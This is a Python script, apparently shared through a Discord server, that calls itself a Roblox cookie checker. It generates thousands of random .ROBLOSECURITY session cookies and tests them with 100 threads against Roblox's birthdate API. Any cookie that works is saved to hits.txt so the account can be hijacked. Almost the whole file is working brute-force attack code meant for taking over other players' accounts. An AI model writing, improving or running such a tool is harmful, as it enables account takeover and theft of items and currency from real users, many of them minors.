import requests
import re
import string
import os
import threading
import random
import time
from queue import Queue

print('ROBLOX COOKIE CHECKER V1R, MAKE SURE TO VOUCH AND JOIN THE SERVER!')
print('JOIN THE DISCORD!!!!!!!!AMAZING SUPPORT!!!!!!!!FREQUENT GIVEAWAYS! \n')
print('SHOUT OUT TO: MEZOX#2346, Roblox Thot#0001, Ackermann#1629, pebbles#3363')
print('moq#0001, Sam.#6605, and BlazingWaterz#0001 FOR BOOSTING THE SERVER!! \n')
print('BOOST THE DISCORD FOR EARLY ACCESS AND CREDITS IN ALL MY SCRIPTS! \n')
print('SCRIPT BY: Egypt#2325, JOIN THE SERVER FOR HELP! discord.gg/bC5VyzQ \n')

outputfile = open("hits.txt", "a")

x = 0
cookies = []
intro = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'
n = 0
print('[RECOMMENDED: Pick a high amount for better odds of generating a valid cookie]')
c = int(input("How many cookies do you want to generate? \n"))
print('Generating random cookies... please be patient! \n')
print('(these are not real cookies they are randomly generated cookies they will now be')
print('checked to find if any of them are valid which is a very low chance but still possible if done for long enough) \n')
letters = 'ABCDEF'

while x < c:

    n = n + 1
    number = str(n) + '###'
    cookiegen = number + intro + ''.join(random.choices(letters + string.digits, k=732))
    cookies += [cookiegen]
    x = x + 1
    
print('Generated ' + str(c) + ' random cookies... checking if any are valid: \n')

t0 = time.time()

def checkcookie(cookies, url):

    try:
        
        cookienumber = cookies.split("###")
        cookie = {'.ROBLOSECURITY': cookienumber[1]}
        r = requests.get(url, cookies = cookie, timeout = 1)
        print('Cookie number: ' + cookienumber[0] + ' checked!', end='\r')
    
        if 'birthYear' in r.text:

            print('\n Valid Cookie!')
            outputfile.write('\n'+ str(cookienumber[1]) + '\n')
            
    except:

        l = 1
    
def manage_queue():
    
    while True:

        url = 'https://accountinformation.roblox.com/v1/birthdate'
        current_cookie = cookie_queue.get()
        checkcookie(current_cookie, url)
        cookie_queue.task_done()

if __name__ == '__main__':

    number_of_threads = 100
    print_lock = threading.Lock()
    cookie_queue = Queue()
    url = 'https://accountinformation.roblox.com/v1/birthdate'
    
    for i in range(number_of_threads):
        
        t = threading.Thread(target=manage_queue)
        t.daemon = True
        t.start()

    for current_cookie in cookies:
        
        cookie_queue.put(current_cookie)
        
    cookie_queue.join()

outputfile.close()

t1 = time.time()
total = t1-t0
print('\nScript executed in: ' + str(int(total)) + ' seconds')

print('Done! IF any valid cookies were found, they have been added to the hits.txt file!')
input("Press enter to exit.")




 
